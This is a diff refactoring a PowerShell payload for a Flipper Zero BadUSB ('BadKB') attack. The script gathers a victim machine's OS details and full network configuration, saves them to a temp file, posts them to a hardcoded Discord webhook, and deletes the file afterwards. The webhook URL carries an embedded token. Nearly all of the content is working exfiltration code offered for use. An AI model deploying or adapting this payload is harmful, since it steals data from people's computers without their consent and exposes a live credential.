@@ -1,6 +1,42 @@
 # BadUSB script example for Flipper Zero - "BadKB"
 # This script will open PowerShell as administrator, gather system information, save it to a file, and send it to a Discord WebHook
 
+# Function to gather system information
+function Get-SystemInformation {
+    try {
+        $sysInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object CSName, Version, BuildNumber, TotalVisibleMemorySize
+        return $sysInfo
+    } catch {
+        Write-Error "Failed to retrieve system information: $_"
+        return $null
+    }
+}
+
+# Function to gather network information
+function Get-NetworkInformation {
+    try {
+        $ipConfig = ipconfig /all
+        return $ipConfig
+    } catch {
+        Write-Error "Failed to retrieve network information: $_"
+        return $null
+    }
+}
+
+# Function to send data to Discord WebHook
+function Send-ToDiscord {
+    param (
+        [string]$webhookUrl,
+        [string]$content
+    )
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)
+    } catch {
+        Write-Error "Failed to send data to Discord: $_"
+    }
+}
+
+# Main script execution
 Start-Sleep -Milliseconds 1000
 # Delay to ensure the computer has time to recognize the device
 
@@ -14,34 +50,24 @@ Start-Sleep -Milliseconds 2000
 
 Start-Sleep -Milliseconds 1500
 
-try {
-    $webhookUrl = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'
-    # Set the Discord WebHook URL
+# Define the Discord WebHook URL
+$webhookUrl = 'https://discord.com/api/webhooks/1225028544258641981/kmftS6B2qpwjcNBn3ovPTEoI8MVsRDikLkYZr1tUTuHNohr-A6ljyvd3MRRGwmI8ehOo'
 
-    $sysInfo = Get-WmiObject -Class Win32_OperatingSystem | Select-Object CSName, Version, BuildNumber, TotalVisibleMemorySize
-    # Get basic system information
+# Gather system and network information
+$sysInfo = Get-SystemInformation
+$ipConfig = Get-NetworkInformation
 
-    $ipConfig = ipconfig /all
-    # Get detailed network configuration
+# Set the file path to save system information
+$filePath = "$env:TEMP\sysinfo.txt"
 
-    $filePath = "$env:TEMP\sysinfo.txt"
-    # Set the file path to save system information
-
+# Save the gathered information to a file with UTF8 encoding
+if ($sysInfo -ne $null -and $ipConfig -ne $null) {
     "$sysInfo`n`n$ipConfig" | Out-File -FilePath $filePath -Encoding UTF8
-    # Save the gathered information to a file with UTF8 encoding
-
     $content = Get-Content -Path $filePath -Raw
-    # Read the content of the file to a variable
-
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)
     # Send the gathered information to the Discord WebHook
-
-    Remove-Item -Path $filePath
+    Send-ToDiscord -webhookUrl $webhookUrl -content $content
     # Remove the file after sending
-}
-catch {
-    Write-Error "An error occurred: $_"
-    # Catch and display any errors that occur during execution
+    Remove-Item -Path $filePath
 }
 
 Exit
